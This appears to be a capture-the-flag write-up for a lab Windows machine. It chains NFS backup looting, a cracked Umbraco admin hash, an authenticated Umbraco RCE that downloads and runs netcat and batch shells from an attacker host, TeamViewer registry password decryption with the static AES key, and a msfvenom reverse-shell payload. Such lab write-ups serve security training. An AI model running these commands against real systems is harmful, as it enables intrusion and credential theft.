1, Recon
port scan 
	21/tcp ftp `Anonymous FTP login allowed`
	80/tcp http
	111/tcp RPC
	444/tcp SMB
	2049/tcp NFS
	5985/tcp http
	47001/tcp http
By checking the http services, only port 80 we can connect it, for port 5985 and port 47001 would refuse the connection.

Firstly, we can check the ftp service because of allowed Anonymous login.
When we login successfully, we would find we can find anything.I guess that would be permission denied and we need to get the valid user.

Then we would check the web-services and by enumerate the existed pages, we can find something useful for us.
`http://10.10.10.180/about-us/todo-list-for-the-starter-kit/`
This is a todo-list for the server.
```
For v1:

- Use a custom grid editor for testimonials
- Integrated Analytics on pages
- Call To Action Button in the grid (with "Tag Manager" integration)
- Macro for fetching products (with friendly grid preview)
- Design Review (polish)
- Verify licenses of photos (Niels)

For vNext

- Swap text with uploaded logo(deleted)
- Nicer pickers of products and employees
- Custom Listview for products and employees
- Discus template on blog posts
- 404 template
- Member Login/Register/Profile/Forgot password
- Update default styling of grid header
- On a Blog post -> Share/Social (tweet this / facebook this)
```

and another login page
`http://10.10.10.180/umbraco/#/login`
![](Pasted%20image%2020240914111230.png)

`Wappalyzer` give us some information of this page, it is powered by `Umbraco` 
And from the source page we find
`<p>For full functionality of Umbraco CMS it is necessary to enable JavaScript.</p>`
By checking the exploit-db, we find something funny
`Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution`, but we need the authentication.
So we need to come back to the todo-list, and find the credit.

When we check some not-found page, it would not be 404 page
![](Pasted%20image%2020240914112003.png)

There is another port 2049 NSF would not be checked.
```
showmount -e 10.10.10.180      

Export list for 10.10.10.180:
/site_backups (everyone)

sudo mount -t nfs 10.10.10.180:/site_backups /mnt/

Then we can get the backup file of this web-service, let's enumeratet the valid credit.
```

By enumerate the backup, I can get 3 useful files
`Web.config, umbraco.config Umbraco.sdf`
The config files would be hard to read and I did not find anything useful, So I come to the `.sdf` file
```
strings Umbraco.sdf | head

Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f

smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32

```

I can guess that there’s an admin account, with email admin@htb.local, and password hash `b8be16afba8c314ad33d812f22a04991b90e2aaa` that is a SHA1. There’s another user, smith, who has a password which is stored using HMACSHA256.

Then we get the credit `admin@htb.local:baconandcheese`

Let's try to login the `umbraco CMS` and try to exploit it.
Then we successfully login and we find the version `Umbraco version 7.12.4`, It is our target!!!!

```
First,we need to upload the nc.exe

python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'wget http://10.10.14.65/nc64.exe -outfile C:/programdata/nc.exe'

Then we can just exec the bat or just exec the command

python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'wget http://10.10.14.65/shell.bat -outfile C:/programdata/shell.bat

python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c "C:/programdata/shell.bat"

Finally, remember to open the netcat to handle the shell

Then we can get the user shell
```

3,Shell as SYSTEM
By enumerate the `C:\Program Files` , There is no other 3-part application
![](Pasted%20image%2020240914115547.png)

But there is another file `TeamViewer 7.lnk` in the `C:\Users\Public\Desktop`
So this place, it would be a hint for us to find the `TeamViewer`
In the file path `C:\Program Files (x86)\TeamViewer\Version7` we can find all the files of `TeamViewer`.

```
There is a Metasploit module post/windows/gather/credentials/teamviewer_passwords. But since I like to avoid Meterpreter to see what’s going on under the hood, I’ll take a look at the source. There’s a list of registry keys, and the one that looks like version 7 is HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7. For each location, it looks for the following values:

OptionsPasswordAES
SecurityPasswordAES
SecurityPasswordExported
ServerPasswordAES
ProxyPasswordAES
LicenseKeyAES
```

```
cd HKLM:\software\wow6432node\teamviewer\version7

get-itemproperty -path .

StartMenuGroup            : TeamViewer 7
InstallationDate          : 2020-02-20
InstallationDirectory     : C:\Program Files (x86)\TeamViewer\Version7
Always_Online             : 1
Security_ActivateDirectIn : 0
Version                   : 7.0.43148
ClientIC                  : 301094961
PK                        : {191, 173, 42, 237...}
SK                        : {248, 35, 152, 56...}
LastMACUsed               : {, 005056B96DD8}
MIDInitiativeGUID         : {514ed376-a4ee-4507-a28b-484604ed0ba0}
MIDVersion                : 1
ClientID                  : 1769137322
CUse                      : 1
LastUpdateCheck           : 1704810710
UsageEnvironmentBackup    : 1
SecurityPasswordAES       : {255, 155, 28, 115...}
MultiPwdMgmtIDs           : {admin}
MultiPwdMgmtPWDs          : {357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77}
Security_PasswordStrength : 3
PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer\vers
                            ion7
PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer
PSChildName               : version7
PSDrive                   : HKLM
PSProvider                : Microsoft.PowerShell.Core\Registry

```

SecurityPasswordAES is there from the list above. It just dumps a list of integers:

```
(get-itemproperty -path .).SecurityPasswordAES

255
155
28
115
214
107
206
49
172
65
62
174
19
27
70
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91
```

Looking a bit more at the Metasploit code, there’s a decrypt function:
```
def decrypt(encrypted_data)
    password = ""
    return password unless encrypted_data

    password = ""

    key = "\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
    iv  = "\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
    aes = OpenSSL::Cipher.new("AES-128-CBC")
    begin
        aes.decrypt
        aes.key = key
        aes.iv = iv
        plaintext = aes.update(encrypted_data)
        password = Rex::Text.to_ascii(plaintext, 'utf-16le')
        if plaintext.empty?
            return nil
        end
    rescue OpenSSL::Cipher::CipherError => e
        print_error("Unable to decrypt the data. Exception: #{e}")
    end
```

It’s using AES128 in CBC mode with a static key and iv. I can easily recreate this in a few lines of Python:

```
#!/usr/bin/env python3

from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 
                    126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")

print(f"[+] Found password: {password}")
```

`[+] Found password: !R3m0te!`

Then we can use `crackmapexec` to verify the smb service or evil-winrm.
```
crackmapexec winrm 10.10.10.180 -u administrator -p "\!R3m0te\!"
WINRM       10.10.10.180    5985   REMOTE           [+] remote\administrator:!R3m0te! (Pwn3d!)
```

Let's exploit it and get the SYSTEM shell.


4,Beyond root
we can also use msfconsole:
Firstly we need to make our `meterpreter payload`
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.65 LPORT=443 -f exe -o reverse_shell.exe`

Then also use our RCE to upload it and exec it.
```
python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'wget http://10.10.14.65/reverse_shell.exe -outfile C:/programdata/reverse_shell.exe

python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c "C:/programdata/reverse_shell.exe"
```

Then we can use msfconsole to handle it:
```
use multi/handler
set payload windows/meterpreter/reverse_tcp

when we get the shell, we can background it and use the teamviewer modulus

use post/windows/gather/credentials/teamviewer_passwords
set session 1
run

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
```

Then we can also get the unattended password.
